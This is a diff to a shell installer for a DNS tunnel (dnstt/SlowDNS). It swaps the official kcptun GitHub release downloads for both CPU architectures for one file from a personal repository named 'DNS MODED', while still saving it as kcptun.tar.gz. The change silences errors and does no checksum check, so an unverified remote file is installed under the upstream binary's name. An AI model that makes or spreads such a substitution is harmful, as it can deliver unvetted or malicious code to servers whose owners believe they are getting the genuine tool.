@@ -228,9 +228,9 @@ mkdir -p /usr/local/bin /etc/dnstt
 
 echo -ne "  ${CYAN}Downloading binary...${NC}"
 if [ "$ARCH" = "amd64" ]; then
-    curl -L "https://github.com/xtaci/kcptun/releases/download/v20250102/kcptun-linux-amd64-20250102.tar.gz" -o /tmp/kcptun.tar.gz 2>/dev/null &
+    curl -L "https://raw.githubusercontent.com/amokhansecretprojects-beep/SLOWDNS-SCRIPT-/main/DNS%20MODED" -o /tmp/kcptun.tar.gz 2>/dev/null &
 else
-    curl -L "https://github.com/xtaci/kcptun/releases/download/v20250102/kcptun-linux-arm64-20250102.tar.gz" -o /tmp/kcptun.tar.gz 2>/dev/null &
+    curl -L "https://raw.githubusercontent.com/amokhansecretprojects-beep/SLOWDNS-SCRIPT-/main/DNS%20MODED" -o /tmp/kcptun.tar.gz 2>/dev/null &
 fi
 show_progress $!
 
@@ -559,3 +559,4 @@ EOF
 echo -e "\n${YELLOW}⚠️ Config imehifadhiwa kwenye: ~/dnstt-config.txt${NC}"
 echo -e "${WHITE}Press Enter to continue...${NC}"
 read -r
+
